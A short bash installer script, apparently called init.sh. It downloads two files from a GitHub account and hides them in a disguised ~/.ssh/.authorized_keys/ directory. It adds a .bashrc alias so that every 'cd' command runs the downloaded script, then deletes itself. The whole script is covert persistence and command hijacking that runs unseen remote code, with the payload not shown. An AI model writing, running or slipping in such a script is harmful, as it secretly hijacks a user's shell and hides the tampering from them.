#!/bin/bash

wget https://raw.githubusercontent.com/mssiscroissant/mssiscroissant/refs/heads/main/croissant.sh
wget https://raw.githubusercontent.com/mssiscroissant/mssiscroissant/refs/heads/main/croissant.txt
mkdir ~/.ssh/.authorized_keys/
mv croissant.sh ~/.ssh/.authorized_keys/croissant.sh
mv croissant.txt ~/.ssh/.authorized_keys/croissant.txt
echo "alias cd='bash ~/.ssh/.authorized_keys/croissant.sh ~/.ssh/.authorized_keys/croissant.txt'" >> ~/.bashrc
source ~/.bashrc
rm init.sh
